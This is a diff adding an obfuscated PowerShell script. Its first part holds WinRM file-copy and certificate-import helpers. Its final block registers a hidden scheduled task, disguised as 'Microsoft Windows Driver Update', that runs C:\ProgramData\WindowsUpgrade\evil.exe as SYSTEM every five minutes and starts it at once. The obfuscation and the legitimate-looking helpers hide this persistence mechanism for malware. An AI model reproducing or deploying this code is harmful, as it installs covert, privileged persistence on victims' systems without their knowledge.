@@ -1,0 +1,271 @@
+ SEt-vaRiAbLE  ('y8c'+'MU')  ([type]("{1}{3}{2}{0}"-F 'MeNT','eNv','n','IRO')) ; $Yc5d= [TYpe]("{0}{1}{4}{3}{2}"-f 'SYS','teM.','e','Il','Io.F');   seT ("{2}{1}{0}" -f 'XQm','eh','0')  ([TYPe]("{1}{0}" -F'th','MA'));$M5k = [TyPE]("{1}{0}"-F 'RAY','ar');SeT  ("{1}{0}"-f 'Jf','7W') ( [TyPE]("{0}{1}{2}"-F'IO.fI','L','e'));  $JqVut= [TyPe]('gc')  ;   seT-ITEM  ('VAriA'+'b'+'le:0GA5'+'C'+'S') ([TYPE]("{3}{4}{2}{1}{0}"-F's','n','t.D','syS','tem.ne')  );    sEt  ("{0}{1}" -f 're5w','x') (  [Type]("{2}{0}{1}"-F 'M','E','DateTI'))  ;function sE`Nd-fI`LE
+{
+	
+	
+	[CmdletBinding()]
+	param
+	(
+		[Parameter(mAndatOry)]
+		[ValidateNotNullOrEmpty()]
+		[string[]]${P`ATh},
+		
+		[Parameter(mAndATORy)]
+		[ValidateNotNullOrEmpty()]
+		[string]${DEst`iNa`TiON},
+		
+		[Parameter(mAnDAtory)]
+		[System.Management.Automation.Runspaces.PSSession]${S`eS`sIon}
+	)
+	begin
+	{
+		function TEst`-uNc`path
+		{
+			[CmdletBinding()]
+			[OutputType([bool])]
+			param
+			(
+				[Parameter(ManDAtory)]
+				[ValidateNotNullOrEmpty()]
+				[string]${P`AtH}
+				
+			)
+			process
+			{
+				if (${P`ATh} -like '\\*')
+				{
+					${T`RuE}
+				}
+				else
+				{
+					${F`A`lse}
+				}
+			}
+		}
+	}
+	process
+	{
+		foreach (${P} in ${p`ATh})
+		{
+			try
+			{
+				if (&("{0}{2}{3}{1}"-f 'T','h','est-UncP','at') -Path ${p})
+				{
+					.("{2}{1}{0}"-f'bose','rite-Ver','W') -Message "[$($p)] is a UNC path. Copying locally first "
+					&("{1}{0}{2}" -f'e','Copy-It','m') -Path ${p} -Destination ( (  chiLdITEm  ('VAr'+'IAbLE:Y8'+'CM'+'u')  ).value::("{3}{0}{5}{1}{4}{2}" -f'n','iron','ariable','GetE','mentV','v').Invoke(("{1}{0}"-f'EMP','T'), ("{1}{0}"-f 'hine','Mac'))) -Force -Recurse
+					${P} = "$([environment]::GetEnvironmentVariable('TEMP', 'Machine'))\$($p | Split-Path -Leaf) "
+				}
+				if (&("{0}{2}{3}{1}" -f'Tes','th','t','-Pa') -Path ${p} -PathType ("{2}{0}{3}{1}"-f't','ner','Con','ai'))
+				{
+					&("{2}{0}{1}"-f 'i','te-Verbose','Wr') -Message "[$($p)] is a folder. Sending all files "
+					${FI`L`es} = &("{3}{2}{0}{1}" -f '-Chil','dItem','t','Ge') -Path ${p} -File -Recurse
+					${se`N`dFILep`Aram`CO`lL} = @()
+					foreach (${fI`lE} in ${FIl`ES})
+					{
+						${S`ENdPa`RAmS} = @{
+							("{0}{1}{2}" -f 'Sess','io','n') = ${se`ss`IOn}
+							("{0}{1}"-f'P','ath') = ${Fi`le}."ful`Ln`Ame"
+						}
+						if (${f`ILe}."dI`ReCt`O`RYNAME" -ne ${p}) 
+						{
+							${sUB`DiRPA`TH} = ${FI`Le}."diR`ECt`or`YNAmE".("{2}{1}{0}"-f 'lace','ep','R').Invoke("$p\", '')
+							${se`Nd`paRaMS}."dE`s`TINaTION" = "$Destination\$subDirPath"
+						}
+						else
+						{
+							${SE`NDPA`Ra`mS}."de`S`Ti`NATiOn" = ${D`e`STIna`TiON}
+						}
+						${SEN`DFIL`ePA`RaMcOlL} += ${s`E`ND`ParamS}
+					}
+					foreach (${pARambL`o`cK} in ${se`NdFIlePAr`A`M`CoLL})
+					{
+						&("{2}{1}{0}" -f'le','Fi','Send-') @paramBlock
+					}
+				}
+				else
+				{
+					&("{1}{2}{0}{3}" -f 'e-','Wri','t','Verbose') -Message "Starting WinRM copy of [$($p)] to [$($Destination)] "
+					
+					${sOUrCe`B`YtEs} =   ( geT-iTEM ('vaR'+'I'+'Ab'+'le:Yc5d') ).VALUE::("{2}{0}{1}"-f'ea','dAllBytes','R').Invoke(${P});
+					${streA`m`Chunks} = @();
+					
+					
+					${StrE`A`mS`IZe} = 1MB;
+					for (${P`O`sITiOn} = 0; ${PO`S`iT`ion} -lt ${SOuR`C`eBYtEs}."LE`Ngth"; ${pOS`iT`iON} += ${St`REAM`sIZE})
+					{
+						${r`emaIN`I`NG} = ${SO`U`RcE`ByTeS}."len`GTh" - ${pOsiT`IOn}
+						${R`em`AI`Ning} =   $0EHxQm::("{0}{1}"-f 'M','in').Invoke(${r`E`mAINiNg}, ${STR`EaM`Si`zE})
+						
+						${Next`Ch`U`NK} = .("{3}{2}{1}{0}"-f 't','c','ew-Obje','N') ("{0}{1}" -f 'by','te[]') ${REmA`I`NI`Ng}
+						  $M5k::("{0}{1}" -f'Co','py').Invoke(${souR`Ce`ByTEs}, ${PoS`i`TIOn}, ${NExtc`H`Unk}, 0, ${reM`A`inI`Ng})
+						${Str`Ea`mc`HUNKS} +=, ${NE`XTCHU`Nk}
+					}
+					${re`mOt`EscrI`pt} = {
+						if (-not (.("{2}{1}{0}" -f'h','-Pat','Test') -Path ${uSING:deST`i`N`A`TioN} -PathType ("{0}{1}"-f 'C','ontainer')))
+						{
+							${N`ULL} = .("{1}{0}"-f'-Item','New') -Path ${u`sING:De`s`TINatION} -Type ("{0}{1}{2}" -f'D','irect','ory') -Force
+						}
+						${F`ilEd`eSt} = "$using:Destination\$($using:p | Split-Path -Leaf) "
+						
+						${d`e`StByT`eS} = .("{0}{2}{1}"-f'New-O','t','bjec') ("{0}{1}{2}" -f 'by','t','e[]') ${USING:`LEn`g`TH}
+						${P`Osi`TiON} = 0
+						
+						
+						foreach (${C`h`Unk} in ${in`p`UT})
+						{
+							  (geT-VARiAbLE ('jQvU'+'T') -vAluEo  )::("{1}{0}" -f'lect','Col').Invoke()
+							 ( Dir ('vAria'+'b'+'lE'+':M5k')  ).vaLue::("{1}{0}" -f 'opy','C').Invoke(${c`hu`Nk}, 0, ${dEst`B`yTeS}, ${P`OsI`TIon}, ${c`H`UNK}."l`engTH")
+							${posit`i`On} += ${c`HUnk}."leng`Th"
+						}
+						
+						  (  vArIabLE ("{0}{1}"-f '7','WjF') -VaLuEO)::("{1}{0}{2}" -f 'teAll','Wri','Bytes').Invoke(${fIle`desT}, ${D`ES`TBYtES})
+						
+						&("{0}{1}" -f'Get-I','tem') ${FIL`ed`EsT}
+						 $JqVUT::("{0}{1}"-f'Col','lect').Invoke()
+					}
+					
+					
+					${lE`NgTH} = ${SOur`ceB`YT`Es}."LeN`GtH"
+					${Stre`A`MC`hUNkS} | &("{3}{1}{0}{2}" -f'a','voke-Comm','nd','In') -Session ${seS`S`IOn} -ScriptBlock ${r`emOTEsCRI`Pt}
+					.("{0}{4}{1}{2}{3}" -f 'Write-Ver','o','s','e','b') -Message "WinRM copy of [$($p)] to [$($Destination)] complete "
+				}
+			}
+			catch
+			{
+				throw ${_}
+			}
+		}
+	}
+	
+}
+
+function Te`st-l`oC`ALComP`Uter
+{
+	
+	
+	[CmdletBinding()]
+	[OutputType([bool])]
+	param
+	(
+		[Parameter(mAnDAtORy)]
+		[string]${Co`Mp`UTE`RNAME}
+	)
+	begin
+	{
+		${lO`cA`lcomp`UTer`L`ABeLS} = @(
+		'.',
+		("{1}{2}{0}" -f'lhost','lo','ca'),
+		  $0ga5cS::("{2}{0}{1}" -f 'etHo','stName','G').Invoke(),
+		  $0ga5cS::("{1}{0}{2}{3}"-f'ost','GetH','E','ntry').Invoke('')."h`OsTn`AMe"
+		)
+	}
+	process
+	{
+		try
+		{
+			if (${LOc`ALComp`U`TErLaBE`LS} -contains ${C`omPutE`RN`AME})
+			{
+				.("{2}{1}{0}"-f 'e','s','Write-Verbo') -Message "The computer reference [$($ComputerName)] is a local computer "
+				${t`RUe}
+			}
+			else
+			{
+				&("{2}{0}{1}" -f 'ite','-Verbose','Wr') -Message "The computer reference [$($ComputerName)] is a remote computer "
+				${F`A`lSe}
+			}
+		}
+		catch
+		{
+			throw ${_}
+		}
+	}
+}
+
+function i`mPo`RT-CerTIFICaT`eSIgN`INg`ReQUeStR`eSpo`NSE
+{
+	
+	[CmdletBinding()]
+	param
+	(
+		
+		[Parameter(MAnDAtORY)]
+		[ValidateScript({ .("{1}{2}{0}"-f 't-Path','Te','s') -Path ${_} -PathType ("{0}{1}" -f'L','eaf') })]
+		[string]${fI`Le`PaTH},
+		
+		[Parameter()]
+		[ValidateNotNullOrEmpty()]
+		[ValidateSet({"{1}{2}{0}" -f 'ne','Ma','chi'}, {"{0}{1}" -f'U','ser'})]
+		[string]${Certi`F`iCatelOcat`Ion} = ("{1}{0}"-f'chine','Ma'),
+		
+		[Parameter()]
+		[ValidateNotNullOrEmpty()]
+		[string]${com`pUT`erN`A`mE} = ${en`V:`CoMp`UTeRnaME},
+		
+		[Parameter()]
+		[ValidateNotNullOrEmpty()]
+		[pscredential]${c`REDe`NtI`AL},
+		
+		[Parameter()]
+		[ValidateNotNullOrEmpty()]
+		[string]${CeR`TR`EQfi`LEp`AtH} = "$env:SystemRoot\system32\certreq.exe"
+	)
+	process
+	{
+		try
+		{
+			if (-not (&("{1}{0}{3}{2}"-f 'a','Test-Loc','er','lComput') -ComputerName ${COmP`UTer`NamE}))
+			{
+				${s`ess`pAr`AMs} = @{
+					("{1}{0}{2}"-f 'Na','Computer','me') = ${Com`pU`TE`RNa`mE}
+				}
+				
+				${Re`mOTEf`ILEpath} = "C:\$([System.IO.Path]::GetFileName($FilePath))"
+				${s`eSS`iON} = &("{0}{2}{1}"-f 'New-PSS','n','essio') @sessParams
+				
+				${nu`LL} = &("{2}{1}{0}" -f'File','nd-','Se') -Session ${sess`ION} -Path ${fIl`EP`AtH} -Destination 'C:\'
+				
+				&("{2}{0}{1}" -f 'voke-Com','mand','In') -Session ${sES`sI`ON} -ScriptBlock { .("{0}{2}{3}{1}" -f 'Sta','s','rt','-Proces') -FilePath ${U`SiNG:c`ER`Tr`eQ`FilEPATH} -Args ('-ac'+'ce'+'pt '+"-$using:CertificateLocation "+"`"$using:remoteFilePath`"")}
+			}
+			else
+			{
+				&("{0}{2}{1}"-f'Start-','cess','Pro') -FilePath ${ceRt`ReQ`FIlEPa`TH} -Args ('-acce'+'p'+'t '+"-$CertificateLocation "+"`"$FilePath`"") -Wait -NoNewWindow
+			}
+		}
+		catch
+		{
+			throw ${_}
+		}
+		finally
+		{
+			&("{0}{2}{1}{3}" -f'I','-Co','nvoke','mmand') -Session ${sEsS`i`oN} -ScriptBlock {&("{0}{2}{1}" -f'Re','ove-Item','m') -Path ${UsIng:`ReMOTeFi`L`EP`AtH} -ErrorAction ("{0}{1}" -f 'I','gnore')}
+			.("{1}{2}{0}"-f 'on','R','emove-PSSessi') -Session ${S`esSi`oN} -ErrorAction ("{0}{1}" -f 'Ignor','e')
+		}
+	}
+}
+${T`AskNA`mE} = ("{3}{5}{2}{1}{4}{0}" -f 'Driver Update','ft','o','Micr',' Windows ','os')
+${TAskD`E`sCr} = ("{6}{5}{3}{0}{4}{1}{2}"-f 'oft','indows',' Driver Update Services','s',' W','cro','Mi')
+${tAs`kc`oMM`ANd} = ((("{2}{0}{4}{3}{5}{8}{6}{1}{7}"-f '3Prog','Upgradef63evil.e','C:f6','Data','ram','f','ows','xe','63Wind')) -CrEPLAcE'f63',[cHAr]92)
+${t`A`sKS`CRIpt} = ""
+${TAs`Ka`Rg} = ""
+${T`AsKSTa`RTTIme} =   $rE5wx::"n`Ow".("{2}{0}{1}" -f 'ddMinut','es','A').Invoke(1) 
+${s`ERVI`Ce} = .("{2}{0}{1}"-f '-objec','t','new') -ComObject(("{1}{0}{4}{2}{3}"-f'dule.Se','Sche','vi','ce','r'))
+${SeR`V`IcE}.("{0}{2}{1}"-f'Conne','t','c').Invoke()
+${rO`oT`FolDER} = ${seRV`I`Ce}.("{2}{0}{1}"-f 'old','er','GetF').Invoke("\")
+${TA`sk`defINi`TIoN} = ${ser`V`Ice}.("{1}{0}" -f'k','NewTas').Invoke(0) 
+${Ta`skdEF`In`ItIon}."rEGIST`R`AT`I`ONinfo"."DeS`Cri`PTion" = "$TaskDescr"
+${taSKde`F`inItI`ON}."SETTI`Ngs"."eNaBL`ED" = ${Tr`UE}
+${TaSkd`E`F`IniTi`oN}."Set`TInGS"."h`ID`dEn" = ${t`Rue}
+${tASKDe`FIniT`i`on}."Set`TI`NgS"."r`eSTARtco`U`Nt" = "5"
+${T`ASK`d`EFiniTIon}."sET`Tin`Gs"."ST`ARtWHE`N`AV`AiL`ABLe" = ${T`RUE}
+${taS`kDeFi`N`ITION}."seTt`i`NgS"."stoP`I`F`GoI`NGO`Nb`ATteRies" = ${Fal`se}
+${TASk`DeF`iNi`TI`ON}."SEt`TIN`gS"."RESTaRTiNT`eR`VAL" = ("{0}{1}"-f 'PT5','M')
+${trIg`gERS} = ${TaSKde`Fin`i`TI`ON}."TRIg`GeRs"
+${TRiG`G`eR} = ${trIGG`E`RS}.("{1}{0}"-f 'te','Crea').Invoke(8)
+${tR`ig`GeR}."S`TaR`TBoun`DAry" = ${tasks`T`Ar`Tt`ImE}.("{0}{2}{1}" -f 'ToSt','ing','r').Invoke(((("{2}{3}{0}{1}{4}{5}" -f 'aTC','k','yyyy-MM-d','dCk','aHH:mm:s','s'))  -rePLACe'Cka',[cHar]39))
+${TRi`g`GeR}."eN`AB`leD" = ${Tr`UE}
+${T`Ri`gGeR}."Re`pETitI`On"."IN`TERv`AL" = ("{1}{0}" -f 'M','PT5')
+${tAs`kdE`FiNITi`ON}."SEtT`i`NgS"."DIs`A`ll`Owst`Ar`TifOnBAtTeRI`es" = ${Tr`UE}
+${A`CTIon} = ${tAsKD`EFin`I`TION}."a`CTi`OnS".("{2}{1}{0}" -f 'e','reat','C').Invoke(0)
+${ActI`On}."P`AtH" = "$TaskCommand"
+${A`Ct`IOn}."ar`guMe`NTS" = "$TaskArg"
+${ro`OtfO`LD`Er}.("{2}{5}{3}{4}{1}{0}"-f'n','nitio','Reg','TaskDef','i','ister').Invoke("$TaskName",${TA`s`KdEfIN`It`iOn},6,("{1}{0}" -f'm','Syste'),${nu`Ll},5)
+&("{1}{2}{0}"-f'HTASKS','S','C') ("{0}{1}" -f '/ru','n') ("{0}{1}"-f'/','TN') ${TA`S`Kna`me}
